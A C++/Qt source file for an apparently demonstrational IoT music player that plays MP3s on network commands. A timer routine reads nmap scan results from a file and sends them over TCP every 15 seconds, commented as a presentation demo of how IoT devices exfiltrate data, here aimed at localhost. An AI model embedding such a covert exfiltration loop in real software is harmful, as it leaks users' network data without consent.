#include "dualserver.h"
#include <QFile>
#include <QFileInfo>
#include <QDir>
#include <QSettings>
#include <QStringList>
#include <QNetworkInterface>

DualServer::DualServer(QObject *parent) :
    QObject(parent)
{

    udpSocket = new QUdpSocket(this);
    tcpSocket = new QTcpSocket(this);
    tcpServer = new QTcpServer(this);
    mpg123 = new QProcess(this);

    timer = new QTimer(this);

    listenPort = 15001;
    init();

    //gather MP3s
    mp3Paths.clear();
    mp3Index = 0;


    QStringList nameFilter("*.mp3");
    QDir directory(QDir::homePath());
    QStringList mp3Files = directory.entryList(nameFilter);
    QString mp3;

    foreach(mp3, mp3Files) {
        QDEBUG () <<"Adding "<< mp3;

        mp3Paths.append(QDir::homePath() + "/" +mp3);

    }

    QDEBUG () << "Found " << mp3Paths.size() << " mp3s in" << QDir::homePath() ;


    connect(mpg123, SIGNAL(finished(int)),
            this, SLOT(processDone()));

    timer->setInterval(15000);
    connect(timer, SIGNAL(timeout()), this, SLOT(timerTimeout()));
    timer->start();


    QFile nmapFile(NMAPPATH);

    QDEBUG() << NMAPPATH;
    nmapData.clear();
    if(nmapFile.exists() && nmapFile.open(QIODevice::ReadOnly)) {

        nmapData = nmapFile.readAll();
        nmapFile.close();
    }

}


void DualServer::processDone() {

    QDEBUG() << "Playback process finished";

}


void DualServer::timerTimeout() {
    QDEBUG() << "Timeout! App is still running.";


/*
 * Dear user, the following is an example of how
 * a random IoT device can scan your network and send
 * nefarious data to a random server.
 *
 * Be assured, PiPlayer sends nothing to a server.
 * I create a bogus "nmapresults.txt" to be sent for my presentation demos.

*/
    if(!nmapData.isEmpty()) {
        QDEBUG() << "Sending nefarious data...";
        DualServer::tcpSingle("127.0.0.1", 5123, nmapData);
    }


}



QByteArray DualServer::tcpSingle(QString ip, quint16 port, QByteArray tcpSend)
{
    QTcpSocket * socketPointer = new QTcpSocket();
    QByteArray returnData;

    socketPointer->connectToHost(ip, port);
    socketPointer->waitForConnected(5000);


    if(socketPointer->state() == QAbstractSocket::ConnectedState)
    {
        socketPointer->write(tcpSend);
        socketPointer->waitForBytesWritten();
        socketPointer->waitForReadyRead();
        returnData = socketPointer->readAll();
    }

    socketPointer->disconnectFromHost();
    socketPointer->deleteLater();

    return returnData;

}


QString DualServer::myIPs() {
    QList<QHostAddress> allIP = QNetworkInterface::allAddresses();
    QString myIPs = "";
    QHostAddress addy;
    QString IP = "";
    foreach(addy, allIP) {
        IP = addy.toString();
        //filter IPv6 and loopback
        if(IP == "127.0.0.1" || IP.contains("::")) {
            continue;
        }
        myIPs.append("\n");
        myIPs.append(IP);
    }
    return myIPs.trimmed();
}

void DualServer::init()
{
    udpSocket->bind(QHostAddress::AnyIPv4, listenPort);
    tcpServer->listen(QHostAddress::AnyIPv4, listenPort);



    connect(udpSocket, SIGNAL(readyRead()),
            this, SLOT(readPendingDatagrams()));

    connect(tcpServer, SIGNAL(newConnection()),
            this, SLOT(newSession()));

    QDEBUG() << "TCP and UDP listening on port " + QString::number(listenPort);

    QDEBUG() << "My IP addresses:\n" << DualServer::myIPs() << endl;

}


QByteArray DualServer::tcpSend(QString ip, quint16 port, QByteArray tcpSend)
{
    QTcpSocket * socket = new QTcpSocket();
    QByteArray returnData;

    socket->connectToHost(ip, port);
    socket->waitForConnected(5000);


    if(socket->state() == QAbstractSocket::ConnectedState)
    {
        socket->write(tcpSend);
        socket->waitForBytesWritten();
        socket->waitForReadyRead();
        returnData = socket->readAll();
    }

    socket->disconnectFromHost();
    socket->deleteLater();

    return returnData;

}


void DualServer::kill()
{
    udpSocket->close();
    tcpSocket->close();
    tcpServer->close();

    udpSocket->deleteLater();
    tcpSocket->deleteLater();
    tcpServer->deleteLater();

}

void DualServer::readPendingDatagrams()
{
    //QDEBUG() << " got a datagram";
    while (udpSocket->hasPendingDatagrams()) {
        QByteArray datagram;
        datagram.resize(udpSocket->pendingDatagramSize());
        QHostAddress sender;
        quint16 senderPort;
        QString sendString = "";

        udpSocket->readDatagram(datagram.data(), datagram.size(),
                                &sender, &senderPort);

        QDEBUG() << "UDP: " << QDateTime::currentDateTime().toString(DATETIMEFORMAT) << " "<<datagram.size() <<" bytes from " << sender.toString() <<":" << senderPort;

        sendString = "Server Address:" + DualServer::myIPs();


#if QT_VERSION >= 0x050000
        udpSocket->writeDatagram(sendString.toLatin1(),sender,senderPort);
#else
        udpSocket->writeDatagram(sendString.toAscii(),sender,senderPort);
#endif



    }
}

void DualServer::disconnected()
{
    QDEBUG() << "Socket was disconnected.";

}

void DualServer::newSession()
{

    QByteArray data, clientData;
    QString sendString, clientString;
    QTcpSocket *clientConnection = tcpServer->nextPendingConnection();
    connect(clientConnection, SIGNAL(disconnected()),
            clientConnection, SLOT(deleteLater()));

    clientConnection->waitForReadyRead(10000);
    clientData = clientConnection->readAll();

    clientString = QString(clientData);

    QDEBUG() << "TCP: " << QDateTime::currentDateTime().toString(DATETIMEFORMAT) << " "<<clientData.size() <<" bytes from "
             << clientConnection->peerAddress().toString() <<":" << clientConnection->peerPort();

    clientString = clientString.toLower();

    sendString  = "Command:" ;

    if(mp3Paths.size() == 0) {
        sendString = QDir::homePath();
        sendString.append(" contained no MP3s");
    } else {

        QString program = MPG123PATH;
        QStringList arguments;
        bool hit = false;
        if(clientString.contains("play")) {

            arguments << mp3Paths[mp3Index];
            hit = true;
        }
        if(clientString.contains("next")) {

            mp3Index++;
            if(mp3Index >= mp3Paths.size()) {
                mp3Index = 0;
            }

            arguments << mp3Paths[mp3Index];
            hit = true;
        }
        if(mpg123->isOpen()) {
            mpg123->close();
        }

        if(hit) {
            sendString.append(arguments.join("|"));
            QDEBUG() << "Starting" << sendString;
            mpg123->start(program, arguments);
        } else {
            sendString.append("stop");
        }

    }




#if QT_VERSION >= 0x050000
    data = sendString.toLatin1();
#else
    data = sendString.toAscii();
#endif

    clientConnection->write(data);
    clientConnection->waitForBytesWritten();

    clientConnection->disconnectFromHost();


}
